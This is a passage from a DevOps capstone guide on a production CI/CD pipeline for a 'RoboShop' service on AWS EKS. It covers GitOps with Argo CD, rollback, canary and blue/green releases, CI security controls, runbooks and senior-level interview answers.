   +--> SonarQube
   +--> Veracode
   +--> Trivy
   |
   v
Merge
   |
   v
Build Immutable Image
   |
   v
ECR
   |
   v
Image Digest
   |
   v
GitOps PR
   |
   +--> Helm lint
   +--> YAML validation
   +--> Policy
   +--> Review
   |
   v
Merge
   |
   v
Argo CD
   |
   v
EKS
   |
   +--> Rolling Update
   +--> Readiness
   +--> HPA
   +--> PDB
   |
   v
Smoke Tests
   |
   v
Prometheus
   |
   +--> Error Rate
   +--> Latency
   +--> Saturation
   |
   v
Release Accepted
```

---

## 94. RoboShop Production Example

Consider a catalogue release:

```text
Developer changes catalogue
       |
       v
Git commit 8f3c1a2
       |
       v
Jenkins / GitHub Actions
       |
       +--> Maven test
       +--> SonarQube
       +--> Veracode
       +--> Trivy
       |
       v
Docker image
       |
       v
ECR
       |
       v
Digest sha256:...
       |
       v
GitOps PR
       |
       v
Argo CD
       |
       v
EKS catalogue Deployment
       |
       +--> 3 replicas
       +--> Service
       +--> ALB
       |
       v
Prometheus
       |
       +--> error rate
       +--> latency
       +--> restart rate
       |
       v
Production verification
```

---

## 95. Production Incident After Deployment

Scenario:

```text
10:00 deployment starts
10:03 rollout complete
10:04 HTTP 500 increases
```

Response:

```text
1. Confirm alert.
2. Check deployment timestamp.
3. Compare error rate before/after.
4. Inspect application logs.
5. Check dependency health.
6. Determine whether release is causal.
7. Stop further promotion.
8. Roll back if customer impact is significant.
9. Verify recovery.
10. Document incident.
```

---

## 96. Release Rollback Example

Known-good digest:

```text
sha256:GOOD
```

Bad digest:

```text
sha256:BAD
```

GitOps rollback:

```bash
git revert <bad-gitops-commit>
git push
```

Argo CD detects the previous digest and reconciles it.

Verification:

```bash
kubectl rollout status deployment/catalogue -n roboshop
```

Then verify Prometheus error rate and application smoke tests.

---

## 97. Canary Release Concept

For higher-risk services:

```text
Stable 95%
Canary 5%
```

Then:

```text
95/5
 |
 v
90/10
 |
 v
75/25
 |
 v
50/50
 |
 v
100/0
```

At each step evaluate:

- error rate
- p95/p99 latency
- saturation
- business metrics

Progressive delivery tooling should be introduced only where operationally justified.

---

## 98. Blue/Green Concept

```text
                 ALB
                  |
          +-------+-------+
          |               |
        Blue            Green
       stable          candidate
```

Deploy green, validate it, then shift traffic.

Advantages:

- fast cutover
- simple traffic reversal

Disadvantages:

- additional capacity
- stateful-system complexity
- more infrastructure cost

---

## 99. Database Deployment Strategy

Application rollback does not automatically mean database rollback.

Safer pattern:

```text
Schema migration A
      |
      v
Deploy compatible application
      |
      v
Validate
      |
      v
Later remove obsolete schema
```

Avoid:

```text
Deploy destructive migration
      |
      v
Application fails
      |
      v
Impossible rollback
```

Database migrations require separate recovery planning.

---

## 100. CI/CD Security Threat Model

Threats include:

- stolen CI credentials
- malicious pull request
- compromised dependency
- poisoned container image
- GitOps compromise
- runner escape
- leaked secrets
- unauthorized production deployment

Controls:

- least privilege
- OIDC/workload identity
- protected branches
- isolated runners
- dependency scanning
- image scanning
- signing/provenance
- GitOps approvals
- audit logs
- short-lived credentials

---

## 101. Least-Privilege AWS CI Role

A CI image-push role should not automatically have:

```text
AdministratorAccess
```

It should receive only the required ECR actions and repository scope.

For example, the role may need actions related to:

```text
ecr:GetAuthorizationToken
ecr:BatchCheckLayerAvailability
ecr:CompleteLayerUpload
ecr:InitiateLayerUpload
ecr:PutImage
ecr:UploadLayerPart
```

Exact permissions depend on the build architecture.

---

## 102. GitOps Write Permissions

A CI identity that updates GitOps should ideally have only the required repository permissions.

It should not automatically have:

```text
organization administrator
```

Protect production branches so even the CI bot cannot bypass required review unless explicitly designed to do so.

---

## 103. Secret Leakage Prevention

Avoid commands that print secrets.

Do not use:

```bash
set -x
```

around secret-bearing commands.

Mask credentials in CI logs.

Never include:

```text
AWS_SECRET_ACCESS_KEY
SONAR_TOKEN
DATABASE_PASSWORD
API_TOKEN
```

in debugging output.

---

## 104. Pipeline Time Optimization

Optimize safely:

```text
Fast checks first
 |
 v
Unit tests
 |
 v
Static/security checks
 |
 v
Build
 |
 v
Image scan
 |
 v
Publish
```

Use parallelism where tests are independent.

Do not parallelize stages in a way that bypasses required ordering or security gates.

---

## 105. Parallel Pipeline Example

```text
             +--> Unit tests
             |
Commit ------+--> Lint
             |
             +--> Dependency scan
             |
             +--> SAST
             |
             +--> IaC validation
             |
             v
          Build image
             |
             v
         Image scan
```

Parallel checks reduce pipeline duration while maintaining the final gate.

---

## 106. Flaky Tests

Flaky tests create false failures.

Track:

- test name
- frequency
- failure history
- environment
- timing

Do not solve flakiness by blindly retrying everything.

Retries can hide real defects.

---

## 107. CI Retry Policy

Retry transient infrastructure failures selectively.

Examples potentially safe to retry:

- temporary registry timeout
- transient network error
- CI agent provisioning failure

Examples that should not be blindly retried:

- unit test assertion failure
- security policy failure
- compilation failure
- invalid Kubernetes YAML

---

## 108. Production Deployment Freeze

During major incidents or infrastructure instability, deployment may be frozen.

```text
Major incident
     |
     v
Deployment freeze
     |
     +--> Emergency fixes only
     |
     v
Service stabilized
     |
     v
Freeze removed
```

The freeze mechanism should be documented and controlled.

---

## 109. Change Windows

If the organization uses change windows, production releases should respect them unless an emergency change is approved.

However, operational maturity means automation should still provide:

- audit trail
- approval record
- deployment evidence
- rollback path

---

## 110. Release Evidence

For each production deployment retain:

```text
Git commit
Build ID
Test results
Security results
Image digest
SBOM
GitOps PR
Approval
Argo CD sync result
Smoke-test result
SLI verification
```

This is valuable during audits and incidents.

---

## 111. Production Pipeline Runbook

### Pipeline failed before build

1. Read failed stage.
2. Check source commit.
3. Reproduce locally or in isolated runner.
4. Correct source/dependency issue.
5. Re-run.

### Image scan failed

1. Identify vulnerability.
2. Determine fixed version.
3. Upgrade dependency/base image.
4. Rebuild.
5. Rescan.

### ECR push failed

1. Verify AWS identity.
2. Verify repository.
3. Verify permissions.
4. Verify region.
5. Verify registry connectivity.

### GitOps update failed

1. Verify Git authentication.
2. Verify branch protection.
3. Validate YAML.
4. Resolve conflict.
5. Re-submit PR.

### Deployment failed

1. Inspect Argo CD.
2. Inspect Kubernetes events.
3. Inspect pods.
4. Inspect logs.
5. Check dependencies.
6. Roll back if necessary.

---

## 112. Production CI/CD Failure Matrix

| Failure | Detection | Immediate action | Prevention |
|---|---|---|---|
| Compile failure | CI | Fix code | Local validation |
| Unit test failure | CI | Stop pipeline | Better tests |
| Quality failure | SonarQube | Fix quality issue | Quality gates |
| SAST failure | Security stage | Block release | Secure coding |
| Image vulnerability | Trivy | Block release | Base-image management |
| ECR failure | Push stage | Fix identity/network | Least privilege |
| GitOps failure | Git stage | Fix PR | Validation |
| Argo failure | Argo CD | Investigate | Pre-deployment checks |
| Rollout failure | Kubernetes | Pause/rollback | Probes/resources |
| Smoke failure | Post-deploy | Rollback | Better testing |
| SLO regression | Prometheus | Rollback/investigate | Canary |
| Runner compromise | Security | Revoke access | Isolation |

---

## 113. Senior Interview — Why GitOps?

**Question:** Why use GitOps instead of Jenkins running kubectl apply?

**Answer:**

I use CI to validate and build the immutable artifact. The deployment state is stored in Git and Argo CD reconciles that state into EKS. This gives version history, auditability, drift detection, separation of duties and a clean rollback mechanism. It also means CI does not need broad permanent Kubernetes production credentials.

---

## 114. Senior Interview — Build Once

**Question:** Why build once and promote?

**Answer:**

Rebuilding per environment can produce different artifacts because dependencies, base images or build conditions may change. I build once, record the immutable image digest, and promote the exact artifact through environments.

---

## 115. Senior Interview — Latest Tag

**Question:** Why is `latest` unsuitable for production?

**Answer:**

It is mutable and does not uniquely identify image content. A production deployment can therefore change without a meaningful configuration change. I use Git SHA tags and immutable image digests so rollback and investigation can identify the exact artifact.

---

## 116. Senior Interview — AWS Credentials

**Question:** How do you secure AWS access from CI?

**Answer:**

I prefer short-lived workload identity or federation, such as GitHub OIDC, rather than static AWS access keys. The role is restricted to the resources and actions required by the pipeline, such as publishing to approved ECR repositories.

---

## 117. Senior Interview — ECR Success, GitOps Failure

**Question:** ECR push succeeded but GitOps update failed. What do you do?

**Answer:**

The artifact is already safely stored, so I do not rebuild it. I investigate Git authentication, branch protection, merge conflicts and YAML validation. Once fixed, I update GitOps using the same immutable digest.

---

## 118. Senior Interview — Synced but Broken

**Question:** Argo CD says Synced but users receive errors. What does that mean?

**Answer:**

Synced means the cluster matches the Git desired state. It does not guarantee application health. I check Argo health, rollout status, pod readiness, logs, ALB target health and Prometheus SLIs such as error rate and latency.

---

## 119. Senior Interview — Rollback

**Question:** How do you rollback a GitOps deployment?

**Answer:**

I normally revert the GitOps commit that introduced the bad image. Argo CD then reconciles the known-good desired state. In an emergency I may use Kubernetes rollback for immediate mitigation, but I reconcile Git afterward so the cluster does not remain in an unmanaged state.

---

## 120. Senior Interview — Security Gate

**Question:** How do you prevent vulnerable images from reaching production?

**Answer:**

I use dependency and filesystem scanning, SAST, image scanning, SBOM/provenance where required, and policy gates that block defined vulnerability thresholds. Exceptions are documented, approved, owned and time-bound rather than permanently ignored.

---

## 121. Senior Interview — Production Safety

**Question:** How do you make production deployment safer?

**Answer:**

I use immutable artifacts, protected GitOps changes, automated validation, readiness probes, controlled rolling updates, post-deployment smoke tests and SLI verification. For higher-risk services I can use progressive delivery such as canary or blue/green releases.

---

## 122. Senior Interview — Deployment vs Release

**Question:** What is the difference between deployment success and release success?

**Answer:**

Deployment success means Kubernetes successfully rolled out the resources. Release success means the application remains healthy for users, including error rate, latency, availability and business SLIs. A rollout can be technically successful while the release is operationally unhealthy.

---

## 123. Senior Interview — CrashLoopBackOff

**Question:** A new deployment is CrashLoopBackOff. How do you troubleshoot?

**Answer:**

I start with `kubectl describe pod`, current logs and previous-container logs. I check exit codes, events, environment/configuration, secrets, resource limits, dependencies and recent deployment changes. If the release is causal and customer impact is significant, I roll back through GitOps.

---

## 124. Senior Interview — ImagePullBackOff

**Question:** Why would a pod get ImagePullBackOff after CI succeeds?

**Answer:**

CI proving that an image exists does not guarantee the EKS node can pull it. I check repository, tag/digest, ECR permissions, node identity, network connectivity, image architecture and pod events.

---

## 125. Senior Interview — CI Compromise

**Question:** What is the biggest security concern with a CI runner?

**Answer:**

The runner executes code from the repository, so if an untrusted build can access production credentials, it can become a path to cloud compromise. I isolate untrusted jobs, avoid exposing production secrets to PR builds, use least privilege and prefer short-lived credentials.

---

## 126. Senior Interview — Database Rollback

**Question:** Why is application rollback not always enough?

**Answer:**

Because database schema changes can be forward-only or destructive. I design migrations for backward compatibility, deploy compatible application versions, and separate destructive cleanup from the initial release so the application can still be rolled back safely.

---

## 127. Senior Interview — Argo CD Role

**Question:** What does Argo CD add if Jenkins already deploys applications?

**Answer:**

Argo CD provides continuous reconciliation between Git and Kubernetes, drift detection, deployment health visibility and a declarative deployment model. Jenkins can remain responsible for CI while Argo CD becomes the CD reconciliation controller.

---

## 128. Senior Interview — Production Debugging

**Question:** Users report 500 errors immediately after a deployment. What is your first approach?

**Answer:**

I first establish impact and correlate the start time with the release. I check Prometheus error rate, deployment status, pod logs, dependency health, service endpoints and ALB target health. If evidence shows the new version caused the incident, I stop further promotion and execute the approved rollback path.

---

## 129. Senior Interview — Pipeline Design

**Question:** What makes a CI/CD pipeline production-grade?

**Answer:**

A production-grade pipeline is reproducible, secure, observable, auditable and reversible. It validates code, enforces security gates, creates immutable artifacts, separates build from deployment, uses GitOps, limits credentials, verifies production health and provides a fast rollback mechanism.

---

## 130. Final Production Principles

The complete production CI/CD model can be summarized as:

```text
Developer
   |
   v
Git
   |
   v
CI
   |
   +--> Build
   +--> Test
   +--> Quality
   +--> Security
   +--> Scan
   |
   v
Immutable Artifact
   |
   v
ECR
   |
   v
GitOps
   |
   v
Argo CD
   |
   v
EKS
   |
   v
Prometheus / Grafana / ELK
   |
   v
Production Verification
   |
   v
Operations
```

The most important rules are:

1. Build once and promote the same artifact.
2. Prefer immutable image digests.
3. Never use `latest` as a production release identifier.
4. Protect source and GitOps branches.
5. Keep CI and CD responsibilities separate.
6. Use least-privilege cloud identities.
7. Prefer short-lived workload identity over static credentials.
8. Scan source, dependencies and images.
9. Keep deployment state in Git.
10. Let Argo CD reconcile EKS.
11. Validate Helm and Kubernetes manifests before release.
12. Use readiness, liveness and startup probes appropriately.
13. Verify the application after deployment.
14. Measure error rate, latency and availability after release.
15. Make rollback fast and GitOps-aware.
16. Protect CI runners from untrusted code.
17. Never expose production secrets to ordinary pull requests.
18. Keep deployment evidence for every production release.
19. Treat database migrations as part of release risk.
20. Optimize for safe delivery, not merely fast delivery.

---

# 131. Complete Production CI/CD Reference

```text
                    +----------------------+
                    |      Developer       |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    |    Application Git   |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    |        CI/CD         |
                    | Jenkins / GH Actions |
                    +----------+-----------+
                               |
          +--------------------+--------------------+
          |                    |                    |
          v                    v                    v
      Build/Test          SonarQube            Security
                                               Scans
          |                    |                    |
          +--------------------+--------------------+
                               |
                               v
                    +----------------------+
                    |   Immutable Image    |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    |        AWS ECR       |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    |      GitOps Repo     |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    |       Argo CD        |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    |       AWS EKS        |
                    +----------+-----------+
                               |
               +---------------+---------------+
               |               |               |
               v               v               v
          Application         ALB        Kubernetes
               |                               |
               +---------------+---------------+
                               |
                               v
                    +----------------------+
                    | Prometheus / Grafana |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    | Operations / On-call |
                    +----------------------+
```

This architecture gives the capstone a complete production delivery path from developer commit to observable workload in EKS.
